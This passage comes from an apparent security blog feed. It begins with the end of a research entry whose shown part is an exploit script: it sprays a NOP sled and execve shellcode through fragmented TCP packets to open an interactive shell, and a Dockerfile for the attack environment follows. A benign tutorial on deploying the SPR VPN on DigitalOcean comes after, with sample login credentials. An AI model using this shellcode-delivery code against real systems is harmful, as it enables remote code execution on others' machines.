style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">tosend</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            tosend </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        tosend </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'LAUNCH %d,%d\n'</span><span class="token operator">%</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">offset</span><span class="token operator">%</span><span class="token number">0x10</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">offset</span><span class="token operator">//</span><span class="token number">0x10</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">range</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            nuke</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0x40</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0x50</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0x58</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0x5b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0x60</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0x70</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0xb0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0xc0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0xc3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0xc6</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0xc7</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0xca</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0xd0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nuke</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0xdc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0xe0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0xec</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0xed</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0xf0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0x108</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0x10c</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0x10d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0x473</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nukes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0x495</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0xc17</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    nuke</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> tosend</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        r</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">tosend</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    tosend </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'ENDTEST\n'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    r</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">tosend</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">arch </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'amd64'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    sc </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"******** sending shellcode ***********"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    d </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'\x90'</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0xd00</span><span class="token operator">+</span><span class="token number">200</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> sc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    tcp_hs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_frag_data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">100</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#raw_input()</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    r</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">recvuntil</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">b'ENDTEST'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)">#raw_input("Ready?")</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Waiting for data to come in..."</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    tcp_hs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">clear_recv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"[+] Good"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">try</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        r</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'aborted'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"over"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token builtin" style="color:rgb(189, 147, 249)">raw_input</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"iptables -F OUTPUT"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    tcp_hs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_fin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    tcp_hs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_rst</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">FROM python:3.8-slim</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Set the working directory</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WORKDIR /app</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Install system dependencies</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RUN apt-get update &amp;&amp; apt-get install -y libpcap-dev</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Install Scapy using pip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RUN pip install scapy pwntools</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RUN pip uninstall pyelftools -y</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RUN pip install pyelftools==0.29</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RUN apt-get install -y iptables net-tools</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RUN apt-get install -y tmux tcpdump iproute2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">COPY connect.py .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ENTRYPOINT ["/app/connect.py"]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="scapy" term="scapy"/>
        <category label="fragmentation" term="fragmentation"/>
        <category label="pwntools" term="pwntools"/>
        <category label="tcpip" term="tcpip"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to use the SPR 1-click install on DigitalOcean]]></title>
        <id>https://www.supernetworks.org/pages/blog/virtual-spr-1click</id>
        <link href="https://www.supernetworks.org/pages/blog/virtual-spr-1click"/>
        <updated>2023-09-10T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Introduction]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://www.supernetworks.org/pages/blog/virtual-spr-1click#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>This guide allows you to setup your own cloud VPN using SPR for <em>$4/month</em> on the DigitalOcean Marketplace. It features ad blocking, firewall rules,
and device micro-segmentation.</p>
<p>If you want to dive in directly: <a href="https://cloud.digitalocean.com/droplets/new?app=spr&amp;onboarding_origin=marketplace&amp;appId=145188909&amp;refcode=24603f3ca4bd&amp;region=nyc1&amp;size=s-1vcpu-512mb-10gb&amp;type=applications&amp;image=supernetworks-spr" target="_blank" rel="noopener noreferrer">Click here</a> to create a droplet using the SPR image. Else, follow along in the steps below.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-1---create-a-spr-droplet">Step 1 - Create a SPR Droplet<a href="https://www.supernetworks.org/pages/blog/virtual-spr-1click#step-1---create-a-spr-droplet" class="hash-link" aria-label="Direct link to Step 1 - Create a SPR Droplet" title="Direct link to Step 1 - Create a SPR Droplet">​</a></h2>
<p>To create a SPR Droplet from the <a href="https://marketplace.digitalocean.com/apps/spr" target="_blank" rel="noopener noreferrer">Digital Ocean marketplace</a>, press the <strong>Create SPR Droplet</strong> button:</p>
<p><img decoding="async" loading="lazy" src="https://www.supernetworks.org/pages/assets/images/cloud-digital-ocean-1click-1-49a5e2b818eaf57523761496d9b739c2.png" width="2880" height="1800" class="img_ev3q"></p>
<p>Pressing the button will take you to the DigitalOcean control panel.
If you are not logged into your DigitalOcean account, you need to login. If you don't have an account, you can <a href="https://cloud.digitalocean.com/registrations/new" target="_blank" rel="noopener noreferrer">sign up for one</a>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-2---configure-your-droplet">Step 2 - Configure your droplet<a href="https://www.supernetworks.org/pages/blog/virtual-spr-1click#step-2---configure-your-droplet" class="hash-link" aria-label="Direct link to Step 2 - Configure your droplet" title="Direct link to Step 2 - Configure your droplet">​</a></h2>
<p><img decoding="async" loading="lazy" src="https://www.supernetworks.org/pages/assets/images/cloud-digital-ocean-2-ca9699589bf6a28aa093388e8024b00b.png" width="2880" height="1618" class="img_ev3q"></p>
<p>Select a region &amp; be sure to create a SSH key if you don't have one configured already.</p>
<p>For Droplet Size, the smallest <em>$4/month</em> with 512 MB RAM is enough but feel free to choose another one.</p>
<p>After you've made all your choices, press <strong>Create droplet</strong>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-3---access-your-droplet">Step 3 - Access your droplet<a href="https://www.supernetworks.org/pages/blog/virtual-spr-1click#step-3---access-your-droplet" class="hash-link" aria-label="Direct link to Step 3 - Access your droplet" title="Direct link to Step 3 - Access your droplet">​</a></h2>
<p><img decoding="async" loading="lazy" src="https://www.supernetworks.org/pages/assets/images/cloud-digital-ocean-1click-2-25c041efb916052c1c9aa4c51a77e7c9.png" width="2880" height="1092" class="img_ev3q"></p>
<p>In the droplet listing you can see the IP address, click <strong>Get started</strong> to see the tutorial and how to access you server.</p>
<p><img decoding="async" loading="lazy" src="https://www.supernetworks.org/pages/assets/images/cloud-digital-ocean-1click-3-5995a05f684eba0d12dc3e7f07c6d52c.png" width="2880" height="1800" class="img_ev3q"></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ssh root@165.232.129.119</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-4---generate-a-vpn-key-and-connect">Step 4 - Generate a VPN Key and Connect<a href="https://www.supernetworks.org/pages/blog/virtual-spr-1click#step-4---generate-a-vpn-key-and-connect" class="hash-link" aria-label="Direct link to Step 4 - Generate a VPN Key and Connect" title="Direct link to Step 4 - Generate a VPN Key and Connect">​</a></h2>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd /home/spr/super &amp;&amp; ./virtual_install.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>You can scan the QR Code generated from the terminal</p>
<p><img decoding="async" loading="lazy" src="https://www.supernetworks.org/pages/assets/images/cloud-digital-ocean-qrcode-a1db6df0e5b64359d51b43908792c3bf.png" width="4068" height="3022" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-5----connecting-to-spr">Step 5 -- Connecting to SPR<a href="https://www.supernetworks.org/pages/blog/virtual-spr-1click#step-5----connecting-to-spr" class="hash-link" aria-label="Direct link to Step 5 -- Connecting to SPR" title="Direct link to Step 5 -- Connecting to SPR">​</a></h2>
<p>To connect to the SPR UI/API, it's possible to connect via the VPN, or to connect with an SSH tunnel</p>
<p>For the ssh tunnel approach, reconnect to the droplet, with forwarding options</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ssh root@165.22.182.180  -N -L 8000:127.0.0.1:8000</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Then navigate to localhost:8000. The password is auto generated by the droplet and presented on the first login .</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] login information:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">==========================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> http tunnel: ssh 165.22.182.180 -N -L 8000:127.0.0.1:8000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">         url: http://localhost:8000/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    username: admin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    password: SmczeGzcEPbBmQEi</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       token: 6Yd2MtMSkm0TiDG2ZIWqoFqxgiHN9HzRJ24m/U8HKw4=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">==========================================================</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>You can update the admin password by modifying <code>/home/spr/super/configs/auth/auth_users.json</code> directly.</p>
